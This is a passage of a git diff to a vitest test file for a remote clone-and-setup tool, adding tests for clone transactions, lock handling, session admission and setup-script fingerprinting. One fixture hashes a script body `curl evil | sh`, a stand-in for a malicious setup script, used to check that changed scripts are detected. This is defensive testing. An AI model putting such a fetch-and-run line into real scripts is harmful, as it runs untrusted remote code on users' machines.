@@ -20,7 +20,18 @@
  * a fake makes the "another clone is running" branch reachable at all.
  */
 import { execFileSync } from "node:child_process";
-import { chmodSync, mkdirSync, mkdtempSync, realpathSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
+import {
+  chmodSync,
+  existsSync,
+  mkdirSync,
+  mkdtempSync,
+  readFileSync,
+  readdirSync,
+  realpathSync,
+  rmSync,
+  symlinkSync,
+  writeFileSync,
+} from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterEach, beforeEach, describe, expect, it } from "vitest";
@@ -38,16 +49,20 @@ import {
   describeSpec,
   diffSetupSpec,
   foundGateDecision,
-  isStagingBasename,
   needsTerminalSetupRecord,
   parseBoxRead,
   parseBoxConfig,
   parseCheckoutProbe,
   parseCloneTransaction,
+  parseAdmission,
+  sessionAdmissionScript,
+  setupFingerprint,
   setupGateDecision,
+  setupReadScript,
   setupSpec,
   sha256,
 } from "../scripts/gjd-remote-flow.js";
+import { setupConfigSha256 } from "../scripts/gjd-remote-setup.js";
 import type { SetupVerdict } from "../scripts/gjd-remote-setup.js";
 
 // ------------------------------------------------------------------ fixtures
@@ -270,7 +285,7 @@ describe("cloneTransactionScript, run for real", () => {
     return { url: `file://${bare}` };
   }
 
-  function transaction(o: { dest: string; staging: string; url: string; statusPath?: string }): string {
+  function transaction(o: { dest: string; staging: string; url: string; statusPath?: string; between?: string }): string {
     return cloneTransactionScript({
       dest: o.dest,
       staging: o.staging,
@@ -278,6 +293,7 @@ describe("cloneTransactionScript, run for real", () => {
       locksDir: join(root, "locks"),
       url: o.url,
       statusPath: o.statusPath ?? join(root, "setup", "owner--name.json"),
+      ...(o.between === undefined ? {} : { between: o.between }),
     });
   }
 
@@ -345,6 +361,93 @@ describe("cloneTransactionScript, run for real", () => {
     if (!got.ok || got.outcome.kind !== "clone-failed") throw new Error(`got ${JSON.stringify(got)}`);
     expect(got.outcome.swept).toBe("removed");
     expect(got.outcome.code).not.toBe("0");
+    expect(existsSync(staging)).toBe(false);
+  });
+
+  /**
+   * GPT Sol's Stage 3 finding 7c. The test above leaves an EMPTY directory
+   * behind, so `rmdir` and a hypothetical `rm -rf` are indistinguishable in it —
+   * it is green whichever the script uses. This one makes git leave a partial
+   * tree, which is what a clone interrupted on the box actually leaves, and
+   * asserts it survives: crash evidence is the only thing anybody has to look
+   * at afterwards.
+   *
+   * A fake `git` on PATH rather than a real interrupted clone, because "git
+   * fails after creating some of the tree" is not a state a test can produce on
+   * demand — and a race is a test that passes for the wrong reason on a slow
+   * machine.
+   */
+  it("keeps a half-made tree when git fails after creating some of it", () => {
+    const bin = join(root, "bin-partial-git");
+    mkdirSync(bin, { recursive: true });
+    // $1 clone, $2 url, $3 staging — the transaction's own call shape.
+    writeFileSync(join(bin, "git"), `#!/bin/sh\nmkdir -p "$3/.git" && printf 'half\\n' > "$3/.git/config"\nexit 128\n`);
+    chmodSync(join(bin, "git"), 0o755);
+    const staging = join(root, "code", ".gjd-remote-staging-thing-4b");
+    const got = parseCloneTransaction(
+      run(transaction({ dest: join(root, "code", "thing"), staging, url: "file:///nowhere.git" }), {
+        path: `${fakeFlock("grant")}:${bin}`,
+      }),
+    );
+    if (!got.ok || got.outcome.kind !== "clone-failed") throw new Error(`got ${JSON.stringify(got)}`);
+    expect(got.outcome.swept).toBe("kept");
+    expect(got.outcome.code).toBe("128");
+    expect(readFileSync(join(staging, ".git", "config"), "utf8")).toBe("half\n");
+  });
+
+  /**
+   * GPT Sol's Stage 3 finding 7b. The "destination appeared while we were not
+   * looking" test above creates the destination BEFORE the script starts, so it
+   * exercises the locked re-check and would pass with no `mv -n` and no inode
+   * comparison at all. The window that matters is between that re-check and the
+   * rename, and `between` is the only way to open it from outside.
+   */
+  it("refuses when the destination appears AFTER the locked re-check", () => {
+    const { url } = upstream();
+    const dest = join(root, "code", "thing");
+    const staging = join(root, "code", ".gjd-remote-staging-thing-race");
+    const got = parseCloneTransaction(
+      run(
+        transaction({
+          dest,
+          staging,
+          url,
+          between: `mkdir -p ${dest} && printf 'mine\\n' > ${dest}/somebody-elses-work.txt`,
+        }),
+        { path: fakeFlock("grant") },
+      ),
+    );
+    if (!got.ok) throw new Error(`got ${JSON.stringify(got)}`);
+    // Either the rename refused (GNU `mv -n`/`-T`) or it moved INTO the
+    // directory and the inode comparison caught it (a weaker `mv`). Both are
+    // refusals, and which one you get is the platform's business — what must
+    // never happen is `ok`.
+    expect(["move-failed", "move-declined"]).toContain(got.outcome.kind);
+    expect(readFileSync(join(dest, "somebody-elses-work.txt"), "utf8")).toBe("mine\n");
+  });
+
+  /**
+   * The inode comparison's own mutation sentinel — Sol's Stage 3 finding 7e.
+   * The comment on it says `mv -n` can decline and still exit 0 on some
+   * coreutils, and nothing reddened that claim: on this machine `mv` never
+   * declines silently, so the comparison could be deleted and every test would
+   * stay green. A fake `mv` that exits 0 and moves nothing IS that coreutils.
+   */
+  it("catches an mv that exits 0 and moved nothing", () => {
+    const { url } = upstream();
+    const bin = join(root, "bin-lying-mv");
+    mkdirSync(bin, { recursive: true });
+    writeFileSync(join(bin, "mv"), "#!/bin/sh\nexit 0\n");
+    chmodSync(join(bin, "mv"), 0o755);
+    const dest = join(root, "code", "thing");
+    const staging = join(root, "code", ".gjd-remote-staging-thing-lying");
+    const got = parseCloneTransaction(
+      run(transaction({ dest, staging, url }), { path: `${fakeFlock("grant")}:${bin}` }),
+    );
+    if (!got.ok || got.outcome.kind !== "move-declined") throw new Error(`got ${JSON.stringify(got)}`);
+    expect(got.outcome.before).toMatch(/^[0-9]+$/);
+    expect(got.outcome.after).toBe("");
+    expect(existsSync(dest)).toBe(false);
   });
 
   it("says a refusal is a refusal, so nothing is sent to look at paths that were never made", () => {
@@ -358,16 +461,34 @@ describe("cloneTransactionScript, run for real", () => {
     expect(cut.ok === false && cut.refused).toBe(false);
   });
 
-  it("refuses outright when another clone holds the lock", () => {
+  /**
+   * GPT Sol's Stage 3 finding 7a: the old version of this test asserted only
+   * the refusal sentence, which the script prints before it touches anything —
+   * so it was green for a script that went on to clone anyway. What a refusal
+   * MEANS is that nothing happened, and that is three assertions, one per thing
+   * the transaction can create.
+   */
+  it("refuses outright when another clone holds the lock, and creates nothing", () => {
     const { url } = upstream();
+    const dest = join(root, "code", "thing");
+    const staging = join(root, "code", ".gjd-remote-staging-thing-5");
+    const statusPath = join(root, "setup", "owner--name.json");
+    mkdirSync(join(root, "setup"), { recursive: true });
+    writeFileSync(statusPath, '{"outcome":"success"}\n');
+
     const got = parseCloneTransaction(
-      run(transaction({ dest: join(root, "code", "thing"), staging: join(root, "code", ".gjd-remote-staging-thing-5"), url }), {
-        path: fakeFlock("busy"),
-      }),
+      run(transaction({ dest, staging, url, statusPath }), { path: fakeFlock("busy") }),
     );
     expect(got.ok).toBe(false);
     if (got.ok) return;
     expect(got.why).toContain("another clone");
+    expect(got.refused).toBe(true);
+    expect(existsSync(dest), "the destination was created behind a held lock").toBe(false);
+    expect(existsSync(staging), "a staging directory was reserved behind a held lock").toBe(false);
+    // The status file is neither archived nor removed: archiving is a
+    // consequence of a clone that happened, and none did.
+    expect(readFileSync(statusPath, "utf8")).toBe('{"outcome":"success"}\n');
+    expect(readdirSync(join(root, "setup"))).toEqual(["owner--name.json"]);
   });
 
   /**
@@ -380,7 +501,8 @@ describe("cloneTransactionScript, run for real", () => {
     const { url } = upstream();
     const statusPath = join(root, "setup", "owner--name.json");
     mkdirSync(join(root, "setup"), { recursive: true });
-    writeFileSync(statusPath, '{"outcome":"success"}\n');
+    const was = '{"outcome":"success","note":"the tree that used to be here"}\n';
+    writeFileSync(statusPath, was);
     const got = parseCloneTransaction(
       run(
         transaction({
@@ -393,7 +515,61 @@ describe("cloneTransactionScript, run for real", () => {
       ),
     );
     expect(got.ok && got.outcome.kind === "ok" && got.outcome.stale).toBe("archived");
-    expect(() => execFileSync("cat", [statusPath], { stdio: ["ignore", "pipe", "pipe"] })).toThrow();
+    expect(existsSync(statusPath)).toBe(false);
+    // ARCHIVED, not deleted — Sol's Stage 3 finding 7d. The old assertion was
+    // that the path had gone, which `rm` satisfies just as well as `mv`, and
+    // this file is the only record of what that checkout once was.
+    const kept = readdirSync(join(root, "setup"));
+    expect(kept).toHaveLength(1);
+    const first = kept[0];
+    if (first === undefined) throw new Error("nothing was kept");
+    expect(first).toMatch(/^owner--name\.json\.stale-\d{8}T\d{6}Z$/);
+    expect(readFileSync(join(root, "setup", first), "utf8")).toBe(was);
+  });
+
+  /**
+   * GPT Sol's Stage 3 finding 3, the clone half. The checkout is in place and
+   * good; the previous checkout's verdict could not be moved aside and is still
+   * sitting at the path every later run reads. That used to be a yellow line
+   * and the clone carried on into setup, so a session could be admitted on a
+   * success about a tree that no longer exists.
+   *
+   * The status directory is made read-only, which is what `mv` out of it needs
+   * and what nothing else in the transaction touches.
+   */
+  it("FAILS the transaction when the old setup status cannot be moved aside", () => {
+    const { url } = upstream();
+    const setupDir = join(root, "setup-locked");
+    const statusPath = join(setupDir, "owner--name.json");
+    mkdirSync(setupDir, { recursive: true });
+    writeFileSync(statusPath, '{"outcome":"success"}\n');
+    chmodSync(setupDir, 0o500);
+    try {
+      const got = parseCloneTransaction(
+        run(
+          transaction({
+            dest: join(root, "code", "thing"),
+            staging: join(root, "code", ".gjd-remote-staging-thing-stuck"),
+            url,
+            statusPath,
+          }),
+          { path: fakeFlock("grant") },
+        ),
+      );
+      if (!got.ok) throw new Error(`got ${JSON.stringify(got)}`);
+      expect(got.outcome.kind).toBe("stale-stuck");
+      if (got.outcome.kind !== "stale-stuck") return;
+      // The checkout IS there and IS the verified tree — the transaction did
+      // its job and then found it could not finish tidying, which is why this
+      // is its own arm rather than a failure of the clone.
+      expect(got.outcome.inode).toMatch(/^[0-9]+$/);
+      expect(got.outcome.origin).toBe(url);
+      expect(existsSync(join(root, "code", "thing", ".git"))).toBe(true);
+      // And the thing that makes it unsafe is still there, for the caller to name.
+      expect(readFileSync(statusPath, "utf8")).toBe('{"outcome":"success"}\n');
+    } finally {
+      chmodSync(setupDir, 0o755);
+    }
   });
 
   /**
@@ -433,22 +609,11 @@ describe("parseCloneTransaction", () => {
   });
 });
 
-describe("isStagingBasename", () => {
-  it("accepts a staging directory", () => {
-    expect(isStagingBasename("/home/greg/code/.gjd-remote-staging-x-1234")).toBe(true);
-  });
-
-  /** The guard this replaces was a shell `case` over the whole path, so an
-   *  innocent child of a staging directory matched it — and the one `rm -rf` in
-   *  the tool took its argument from exactly that check. */
-  it("refuses a child of a staging directory", () => {
-    expect(isStagingBasename("/home/greg/code/.gjd-remote-staging-x-1234/src/anything")).toBe(false);
-  });
-
-  it("refuses the bare prefix with nothing after it", () => {
-    expect(isStagingBasename("/home/greg/code/.gjd-remote-staging-")).toBe(false);
-  });
-});
+// `isStagingBasename` was tested here and called by nothing in production —
+// GPT Sol's Stage 3 finding 7. Both it and these three tests are gone; the
+// guard that actually protects the one `rm -rf` is the `mkdir` reservation,
+// which "never touches a directory it did not create at the staging name"
+// above reddens by running it.
 
 // ------------------------------------------------------------ the setup spec
 
@@ -504,12 +669,50 @@ describe("setupSpec and diffSetupSpec", () => {
     expect(diffSetupSpec(a, b).map((d) => d.field)).toContain("warnings");
   });
 
-  it("ignores a script that is not the thing being run", () => {
-    // Not executable, and a config command wins anyway: its bytes are an
-    // irrelevance, and the warning about it is what carries the difference.
+  /**
+   * GPT Sol's Stage 3 finding 2, and the case that made him call it a blocker
+   * again: a config that names the wrapper EXPLICITLY resolves as
+   * `source: "config"`, not `"script"` — so the old rule, which carried the
+   * hash only for `source === "script"`, dropped the hash of the very file the
+   * command runs. Reproduced against the code before the fix: the diff was
+   * empty for two scripts doing entirely different things.
+   */
+  it("notices a changed setup script even when the CONFIG is what names it", () => {
+    const toml = 'setup = "./.gjd-remote/setup"\n';
+    const a = spec(toml, { scriptSha256: sha256("#!/bin/sh\nnpm ci\n") }, { setupScript: "executable" });
+    const b = spec(toml, { scriptSha256: sha256("#!/bin/sh\ncurl evil | sh\n") }, { setupScript: "executable" });
+    expect(a.source).toBe("config");
+    expect(a.setup).toBe(b.setup);
+    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual([".gjd-remote/setup contents"]);
+    expect(setupFingerprint(a)).not.toBe(setupFingerprint(b));
+  });
+
+  /** The same trap on the other convention: `npm ci && npm run setup` spelled
+   *  out in the config is still `source: "config"`, and what `npm run setup`
+   *  runs is still not in the command. */
+  it("notices a changed package.json body even when the CONFIG is what names the wrapper", () => {
+    const toml = 'setup = "npm ci && npm run setup"\n';
+    const a = spec(toml, { packageSetup: "node scripts/setup.js" }, { pkg: true });
+    const b = spec(toml, { packageSetup: "node scripts/other.js" }, { pkg: true });
+    expect(a.source).toBe("config");
+    expect(a.setup).toBe(b.setup);
+    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual(["package.json scripts.setup"]);
+    expect(setupFingerprint(a)).not.toBe(setupFingerprint(b));
+  });
+
+  /**
+   * The cost of carrying both facts unconditionally, asserted rather than
+   * hoped: a script nothing runs still counts as a difference. This test used
+   * to assert the opposite, and the opposite is what let the two cases above
+   * through — a rule that decides which inputs matter from `source` is a rule
+   * that has to be right about `source` in every configuration, and it was not.
+   * Being too strict costs one `gjd-remote setup`; being too loose costs a
+   * session in a tree set up by a script nobody agreed to.
+   */
+  it("counts an ignored setup script as a difference, because deciding otherwise needs source to be right", () => {
     const a = spec('setup = "npm ci"\n', { scriptSha256: sha256("one") }, { setupScript: "not-executable" });
     const b = spec('setup = "npm ci"\n', { scriptSha256: sha256("two") }, { setupScript: "not-executable" });
-    expect(diffSetupSpec(a, b)).toEqual([]);
+    expect(diffSetupSpec(a, b).map((d) => d.field)).toEqual([".gjd-remote/setup contents"]);
   });
 
   it("notices a check that only one side has", () => {
@@ -523,6 +726,43 @@ describe("setupSpec and diffSetupSpec", () => {
     expect(describeSpec(s)).toContain("script");
     expect(describeSpec(s)).toContain("sha ");
     expect(describeSpec(spec("", {}))).toBe("(none known)");
+  });
+
+  /**
+   * The fingerprint has to move whenever ANY execution input does, because it
+   * is what the durable status carries and what the locked job re-checks. One
+   * field at a time, so a fingerprint that quietly stopped reading one of them
+   * fails on that field's row rather than passing five of six.
+   */
+  it("moves for every execution input, one at a time", () => {
+    const base = spec('setup = "npm ci"\ncheck = "npm run doctor"\n', {
+      scriptSha256: sha256("one"),
+      packageSetup: "node a.js",
+    });
+    const rows: [string, SetupSpec][] = [
+      ["setup", spec('setup = "npm ci --force"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" })],
+      ["check", spec('setup = "npm ci"\ncheck = "npm run other"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" })],
+      ["script", spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("two"), packageSetup: "node a.js" })],
+      ["package", spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node b.js" })],
+      [
+        "warnings",
+        spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" }, { setupScript: "executable" }),
+      ],
+    ];
+    for (const [what, other] of rows) {
+      expect(setupFingerprint(other), `${what} did not move the fingerprint`).not.toBe(setupFingerprint(base));
+    }
+    // And it is stable: the same inputs twice are the same hash, or every
+    // second run would be `config-changed`.
+    expect(setupFingerprint(spec('setup = "npm ci"\ncheck = "npm run doctor"\n', { scriptSha256: sha256("one"), packageSetup: "node a.js" }))).toBe(
+      setupFingerprint(base),
+    );
+  });
+
+  it("never collides with the command-only hash it replaces", () => {
+    // Both are sha256 of a JSON literal, and only `v` keeps them apart.
+    const s = spec('setup = "npm ci"\n', {});
+    expect(setupFingerprint(s)).not.toBe(setupConfigSha256("npm ci", undefined));
   });
 });
 
@@ -605,9 +845,50 @@ describe("foundGateDecision", () => {
     }
   });
 
-  it("refuses only while a setup actually holds the lock", () => {
+  /**
+   * GPT Sol's Stage 3 finding 1. This used to refuse `in-progress + held` and
+   * NOTHING ELSE, so a `success` verdict walked past a lock that a setup was
+   * holding — and that combination is not exotic: it is the window before a
+   * running job has written its `started` status, and the window after it has
+   * written its terminal one. In both, the tree is being rewritten while the
+   * verdict is telling the truth about a different moment.
+   */
+  it("refuses EVERY verdict while the lock is held, success included", () => {
+    for (const v of Object.keys(verdicts)) {
+      const got = foundGateDecision(verdicts[v] as SetupVerdict, "held");
+      expect(got.kind, `${v} + held was not refused`).toBe("refuse");
+    }
+    const got = foundGateDecision(verdicts.success as SetupVerdict, "held");
+    expect(got.kind === "refuse" && got.why).toContain("RIGHT NOW");
+    // Still a warn when nothing holds it: refusing a free lock would stop every
+    // session in a repo that was set up by hand, which is `~/code/spideryarn2`.
     expect(foundGateDecision(verdicts["in-progress"] as SetupVerdict, "free").kind).toBe("warn");
-    expect(foundGateDecision(verdicts["in-progress"] as SetupVerdict, "held").kind).toBe("refuse");
+  });
+
+  /** No flock is no serialisation, so `free` is a guess and
+   *  `sessionAdmissionScript` cannot run at all. The same refusal
+   *  `setupGateDecision` makes. */
+  it("refuses every verdict when the box has no flock", () => {
+    for (const v of Object.keys(verdicts)) {
+      expect(foundGateDecision(verdicts[v] as SetupVerdict, "noflock").kind, v).toBe("refuse");
+    }
+  });
+
+  /**
+   * Sol's Stage 3 finding 1 again, the other half: a status file that is there
+   * and cannot be parsed used to print a yellow line and let the session start.
+   * Something wrote that file. "I cannot read the evidence" is not evidence.
+   */
+  it("refuses when the status file could not be read or believed, whatever the lock says", () => {
+    for (const lock of ["none", "free", "held", "noflock"] as const) {
+      const got = foundGateDecision(verdicts.success as SetupVerdict, lock, "the status file is not JSON");
+      expect(got.kind, `unreadable + ${lock}`).toBe("refuse");
+      if (got.kind !== "refuse") continue;
+      expect(got.why).toContain("not JSON");
+    }
+    // And the reason is only consulted when there IS one: an absent third
+    // argument must not read as an unreadable file.
+    expect(foundGateDecision(verdicts.success as SetupVerdict, "free").kind).toBe("go");
   });
 
   /** Sol's finding 7: a status about another tree is worse than no status,
@@ -617,6 +898,311 @@ describe("foundGateDecision", () => {
     expect(got.kind).toBe("refuse");
     if (got.kind !== "refuse") return;
     expect(got.why).toContain("gjd-remote setup");
+  });
+});
+
+// ------------------------------------------------------- admitting a session
+
+/**
+ * GPT Sol's Stage 3 finding 1, and the part `foundGateDecision` cannot do.
+ *
+ * The gate reads a status and decides; `tmux new-session` happens seconds
+ * later. These run the script that closes that gap, for real, and the thing
+ * every one of them turns on is whether the CALLER'S COMMAND RAN — proved by
+ * the command creating a file, never by the word in the reply.
+ */
+describe("sessionAdmissionScript, run for real", () => {
+  /** The command the admission runs, and the file that says it did. */
+  function marker(): { command: string; path: string } {
+    const path = join(root, "the-session-was-created");
+    return { command: `printf 'created\\n' > ${path}`, path };
+  }
+
+  function admit(o: { expect: string | null; command: string; statusPath?: string; flock?: "grant" | "busy" }): string {
+    return run(
+      sessionAdmissionScript({
+        lockPath: join(root, "locks", "setup-owner--name.lock"),
+        locksDir: join(root, "locks"),
+        statusPath: o.statusPath ?? join(root, "setup", "owner--name.json"),
+        expect: o.expect,
+        command: o.command,
+      }),
+      { path: fakeFlock(o.flock ?? "grant") },
+    );
+  }
+
+  const b64 = (text: string) => Buffer.from(text, "utf8").toString("base64");
+
+  function writeStatus(text: string): string {
+    const p = join(root, "setup", "owner--name.json");
+    mkdirSync(join(root, "setup"), { recursive: true });
+    writeFileSync(p, text);
+    return p;
+  }
+
+  it("runs the command when the status under the lock is the one the laptop saw", () => {
+    const text = '{"v":1,"outcome":"success"}\n';
+    writeStatus(text);
+    const m = marker();
+    const got = parseAdmission(admit({ expect: b64(text), command: m.command }));
+    if (!got.ok) throw new Error(got.why);
+    expect(got.admission).toEqual({ kind: "ran", code: 0 });
+    expect(readFileSync(m.path, "utf8")).toBe("created\n");
+  });
+
+  it("runs the command when there was no status and there still is none", () => {
+    const m = marker();
+    const got = parseAdmission(admit({ expect: null, command: m.command }));
+    expect(got.ok && got.admission.kind).toBe("ran");
+    expect(existsSync(m.path)).toBe(true);
+  });
+
+  /**
+   * The whole point: between the laptop's read and the lock, a setup finished
+   * (or started, or failed) and rewrote the verdict. The decision the laptop
+   * made was about a file that no longer exists, so nothing may run on it.
+   */
+  it("REFUSES, and runs nothing, when the status changed underneath", () => {
+    writeStatus('{"v":1,"outcome":"failed"}\n');
+    const m = marker();
+    const got = parseAdmission(admit({ expect: b64('{"v":1,"outcome":"success"}\n'), command: m.command }));
+    if (!got.ok) throw new Error(got.why);
+    expect(got.admission.kind).toBe("changed");
+    if (got.admission.kind !== "changed") return;
+    // And it hands back what it now says, so the caller can print it rather
+    // than telling somebody to go and look.
+    expect(got.admission.status).toBe('{"v":1,"outcome":"failed"}\n');
+    expect(existsSync(m.path), "the session was created against a status nobody read").toBe(false);
+  });
+
+  it("REFUSES, and runs nothing, when a status appeared where there was none", () => {
+    writeStatus('{"v":1,"outcome":"started"}\n');
+    const m = marker();
+    const got = parseAdmission(admit({ expect: null, command: m.command }));
+    expect(got.ok && got.admission.kind).toBe("changed");
+    expect(existsSync(m.path)).toBe(false);
+  });
+
+  it("REFUSES, and runs nothing, when the status vanished", () => {
+    const m = marker();
+    const got = parseAdmission(admit({ expect: b64('{"v":1,"outcome":"success"}\n'), command: m.command }));
+    if (!got.ok) throw new Error(got.why);
+    expect(got.admission).toEqual({ kind: "changed", status: undefined });
+    expect(existsSync(m.path)).toBe(false);
+  });
+
+  /** A setup for this repo holds the lock, so the tree is being rewritten right
+   *  now — whatever the status file happens to say at this instant. */
+  it("REFUSES, and runs nothing, while a setup holds the lock", () => {
+    const text = '{"v":1,"outcome":"success"}\n';
+    writeStatus(text);
+    const m = marker();
+    const got = parseAdmission(admit({ expect: b64(text), command: m.command, flock: "busy" }));
+    if (!got.ok) throw new Error(got.why);
+    expect(got.admission).toEqual({ kind: "held" });
+    expect(existsSync(m.path), "a session was started in a tree a setup is rewriting").toBe(false);
+  });
+
+  it("carries the command's own exit code back", () => {
+    writeStatus("x\n");
+    const got = parseAdmission(admit({ expect: b64("x\n"), command: "exit 42" }));
+    expect(got.ok && got.admission).toEqual({ kind: "ran", code: 42 });
+  });
+
+  /**
+   * `tmux new-session` may START the tmux server, and a server that inherited
+   * fd 9 would hold the setup lock until the box is rebooted — the same
+   * open-file-description trap as the setup job's `run_step`, with a daemon on
+   * the end of it. So the command is given no fd 9 at all, and it is asked.
+   */
+  it("gives the command no copy of the lock descriptor", () => {
+    writeStatus("x\n");
+    const path = join(root, "fd9");
+    const got = parseAdmission(
+      admit({ expect: b64("x\n"), command: `if [ -e /dev/fd/9 ]; then printf o%s > ${path}; else printf c%s > ${path}; fi` }),
+    );
+    expect(got.ok && got.admission.kind).toBe("ran");
+    expect(readFileSync(path, "utf8")).toBe("c");
+  });
+
+  /** The reply is a wire format, and the command's own chatter must not be in
+   *  it — a `tmux` that printed a line would otherwise be a field nobody asked
+   *  for, and the parser would refuse a session that was created. */
+  it("keeps the command's output out of the reply", () => {
+    writeStatus("x\n");
+    const got = parseAdmission(admit({ expect: b64("x\n"), command: "echo step surprise" }));
+    expect(got.ok && got.admission.kind).toBe("ran");
+  });
+
+  it("refuses a command it cannot embed safely", () => {
+    const base = { lockPath: "/l", locksDir: "/L", statusPath: "/s", expect: null };
+    expect(() => sessionAdmissionScript({ ...base, command: "a\nb" })).toThrow(/one line/);
+    expect(() => sessionAdmissionScript({ ...base, command: "  " })).toThrow(/empty/);
+    expect(() => sessionAdmissionScript({ ...base, command: "a\u001b[2Kb" })).toThrow(/control character/);
+    expect(() => sessionAdmissionScript({ ...base, command: "true", expect: "not base64!" })).toThrow(/base64/);
+  });
+});
+
+describe("parseAdmission", () => {
+  const reply = (o: { admit: string; state: string; text: string; code: string }) =>
+    [BOX_OK, `admit ${o.admit}`, `state ${o.state}`, `text ${o.text}`, `code ${o.code}`, BOX_END].join("\n");
+
+  it("refuses a reply cut short, and says nothing about whether the session exists", () => {
+    const got = parseAdmission([BOX_OK, "admit ran", "state present"].join("\n"));
+    expect(got.ok).toBe(false);
+    if (got.ok) return;
+    expect(got.refused).toBe(false);
+  });
+
+  it("hands back the box's own refusal as one", () => {
+    const got = parseAdmission(`${BOX_ERR} flock is not on this box, so a session cannot be admitted safely\n`);
+    expect(got.ok === false && got.refused).toBe(true);
+  });
+
+  it("refuses a held lock that also claims to have read something", () => {
+    expect(parseAdmission(reply({ admit: "held", state: "present", text: "eA==", code: "-" })).ok).toBe(false);
+  });
+
+  it("refuses a 'ran' with no exit code, rather than assuming zero", () => {
+    expect(parseAdmission(reply({ admit: "ran", state: "present", text: "eA==", code: "-" })).ok).toBe(false);
+    expect(parseAdmission(reply({ admit: "ran", state: "present", text: "eA==", code: "no" })).ok).toBe(false);
+  });
+
+  it("refuses a 'changed' that reports an exit code, because nothing ran", () => {
+    expect(parseAdmission(reply({ admit: "changed", state: "present", text: "eA==", code: "0" })).ok).toBe(false);
+  });
+
+  it("refuses a word it does not know, and a status that contradicts itself", () => {
+    expect(parseAdmission(reply({ admit: "maybe", state: "present", text: "eA==", code: "-" })).ok).toBe(false);
+    expect(parseAdmission(reply({ admit: "changed", state: "nonsense", text: "-", code: "-" })).ok).toBe(false);
+    expect(parseAdmission(reply({ admit: "changed", state: "absent", text: "eA==", code: "-" })).ok).toBe(false);
+  });
+
+  it("refuses text that did not survive the trip", () => {
+    const cut = Buffer.from("a reasonably long status here", "utf8").toString("base64").slice(0, -6);
+    expect(parseAdmission(reply({ admit: "changed", state: "present", text: cut, code: "-" })).ok).toBe(false);
+  });
+});
+
+// ------------------------------------------- the lock, the status, the inode
+
+/**
+ * GPT Sol's Stage 3 finding 7f. The `LockState` matrix injects the four states
+ * directly and so says nothing about the producer — a probe that never looked
+ * for `flock` at all would satisfy every one of those rows. The one arrangement
+ * where the two orders differ is a box with NO `flock` and a lock file present:
+ * probing the file first answers `free`, which is a sentence about a lock that
+ * cannot exist. So the script is run with `flock` genuinely off the PATH.
+ *
+ * The two `noflock` cases can only run where there is no real `flock` to hide.
+ * The script extends its own PATH with the standard directories on purpose, so
+ * that an ssh with a thin environment still finds its tools, and there is no
+ * honest way to take `/usr/bin/flock` away from it. That is this Mac; on the
+ * box and on Linux CI they skip, exactly as the job script's own `noflock` test
+ * does in tests/gjd-remote-setup.test.ts. The other four rows run everywhere.
+ */
+const FLOCK_ON_STANDARD_PATHS =
+  execFileSync("bash", ["--norc", "--noprofile", "-c", "command -v flock >/dev/null 2>&1 && echo yes || echo no"], {
+    encoding: "utf8",
+    // --norc --noprofile, and a PATH of exactly the directories the script
+    // appends to its own: a startup file that put a directory back on PATH
+    // would make this answer the wrong question, quietly.
+    env: { PATH: "/usr/local/bin:/usr/bin:/bin" },
+  }).trim() === "yes";
+
+describe("setupReadScript, run for real", () => {
+  /** A PATH with nothing named `flock` on it: a shim directory of symlinks to
+   *  the handful of tools the script uses. */
+  function pathWithoutFlock(): string {
+    const bin = join(root, "bin-no-flock");
+    mkdirSync(bin, { recursive: true });
+    for (const tool of ["bash", "base64", "ls", "awk", "tr", "cat", "sh"]) {
+      const found = execFileSync("bash", ["-c", `command -v ${tool} || true`], { encoding: "utf8" }).trim();
+      if (found !== "") symlinkSync(found, join(bin, tool));
+    }
+    return bin;
+  }
+
+  function read(o: { lockPath: string; statusPath: string; dir: string; path?: string; noFlock?: boolean }) {
+    const script = setupReadScript({ statusPath: o.statusPath, lockPath: o.lockPath, dir: o.dir });
+    // A bare PATH (no inherited entries) is the only way to make `flock` absent
+    // on a box that has one; `run` prepends to process.env.PATH, so this goes
+    // round it deliberately.
+    const out = o.noFlock
+      ? execFileSync("bash", ["--norc", "--noprofile", "-c", script], {
+          encoding: "utf8",
+          stdio: ["ignore", "pipe", "pipe"],
+          env: { PATH: pathWithoutFlock() },
+        })
+      : run(script, o.path === undefined ? {} : { path: o.path });
+    return parseBoxRead(out, ["lock", "inode", "status", "text"]);
+  }
+
+  const paths = () => ({
+    lockPath: join(root, "locks", "setup-owner--name.lock"),
+    statusPath: join(root, "setup", "owner--name.json"),
+    dir: join(root, "code", "thing"),
+  });
+
+  it.skipIf(FLOCK_ON_STANDARD_PATHS)("says noflock — not none — when the box has no flock and a lock file is there", () => {
+    const p = paths();
+    mkdirSync(join(root, "locks"), { recursive: true });
+    writeFileSync(p.lockPath, "");
+    const got = read({ ...p, noFlock: true });
+    if (!got.ok) throw new Error(got.why);
+    expect(got.fields.get("lock")).toBe("noflock");
+  });
+
+  it.skipIf(FLOCK_ON_STANDARD_PATHS)("says noflock when the box has no flock and there is no lock file either", () => {
+    // The arrangement the old order got RIGHT by accident is the one that
+    // matters least; this is the same box, and the answer must not change.
+    const got = read({ ...paths(), noFlock: true });
+    expect(got.ok && got.fields.get("lock")).toBe("noflock");
+  });
+
+  it("says none when there is a flock and nothing has ever taken the lock", () => {
+    const got = read({ ...paths(), path: fakeFlock("grant") });
+    expect(got.ok && got.fields.get("lock")).toBe("none");
+    // And LOOKING did not create it: "there is a lock file" is a fact worth
+    // keeping true.
+    expect(existsSync(paths().lockPath)).toBe(false);
+  });
+
+  it("tells a lock nobody holds from one somebody does", () => {
+    const p = paths();
+    mkdirSync(join(root, "locks"), { recursive: true });
+    writeFileSync(p.lockPath, "");
+    expect(read({ ...p, path: fakeFlock("grant") }).ok && read({ ...p, path: fakeFlock("grant") })).toBeTruthy();
+    const free = read({ ...p, path: fakeFlock("grant") });
+    expect(free.ok && free.fields.get("lock")).toBe("free");
+    const held = read({ ...p, path: fakeFlock("busy") });
+    expect(held.ok && held.fields.get("lock")).toBe("held");
+  });
+
+  it("carries the status file and the checkout's inode in the same trip", () => {
+    const p = paths();
